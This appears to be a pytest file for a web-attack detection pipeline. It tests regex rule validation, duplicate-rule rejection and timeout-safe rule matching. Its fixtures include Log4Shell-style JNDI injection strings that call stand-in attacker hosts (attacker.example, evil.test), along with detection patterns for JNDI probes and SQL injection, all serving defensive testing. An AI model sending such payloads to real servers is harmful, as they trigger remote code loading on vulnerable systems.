import time
import regex
from pipeline.rules import load_benign_samples, match_dynamic, validate_suggested_regex
from shared import db


def test_validate_good_and_bad_regexes():
    benign = load_benign_samples()
    attack = "${jndi:ldap://attacker.example/a}"

    ok, _ = validate_suggested_regex(r"\$\{jndi:(ldap|rmi|dns)", attack, benign)
    assert ok is True

    # Empty, wildcard, too long, nested quantifier, invalid syntax, non-matching, benign match
    assert validate_suggested_regex("", attack, benign)[0] is False
    assert validate_suggested_regex(".*", attack, benign)[0] is False
    assert validate_suggested_regex("a" * 201, attack, benign)[0] is False
    assert validate_suggested_regex(r"(a+)+", "aaaa", benign)[0] is False
    assert validate_suggested_regex(r"[unclosed", attack, benign)[0] is False
    assert validate_suggested_regex(r"union\s+select", attack, benign)[0] is False
    assert validate_suggested_regex(r"login", "POST /login username=a", benign)[0] is False


def test_duplicate_rule_rejected(monkeypatch, tmp_path):
    # Point DB to a temp sqlite file if your db module reads DATABASE_URL
    rule = {
        "pattern": r"\$\{jndi:(ldap|rmi|dns)",
        "target": "user_agent",
        "attack_type": "Command Injection",
        "severity": "Critical",
        "mitre_id": "T1190",
        "mitre_name": "Exploit Public-Facing Application",
        "explanation": "JNDI probe",
        "recommended_rule": "block",
        "status": "pending_review",
        "source_event_id": 1,
    }
    first_id = db.add_dynamic_rule(rule)
    dup_id = db.add_dynamic_rule(rule)
    assert first_id is not None
    assert dup_id is None


def test_match_dynamic_only_active_and_handles_timeout(monkeypatch):
    monkeypatch.setattr(db, "record_rule_hit", lambda _id: None)
    event = {
        "method": "GET",
        "path": "/",
        "query": "",
        "body": "",
        "user_agent": "${jndi:ldap://evil.test/x}",
    }
    active_rule = {
        "id": 10,
        "pattern": r"\$\{jndi:(ldap|rmi|dns)",
        "target": "user_agent",
        "rx": regex.compile(r"\$\{jndi:(ldap|rmi|dns)", regex.IGNORECASE),
        "attack_type": "Command Injection",
        "severity": "Critical",
        "mitre_id": "T1190",
        "mitre_name": "Exploit Public-Facing Application",
        "explanation": "JNDI probe",
        "recommended_rule": "block",
        "status": "active",
    }

    hit = match_dynamic(event, [active_rule])
    assert hit is not None
    assert hit["source"] == "dynamic"

    # Simulated slow regex should not crash match_dynamic
    class SlowRx:
        def search(self, _text, timeout=0.05):
            time.sleep(0.08)
            raise TimeoutError()

    slow_rule = {**active_rule, "id": 11, "rx": SlowRx()}
    assert match_dynamic(event, [slow_rule]) is None
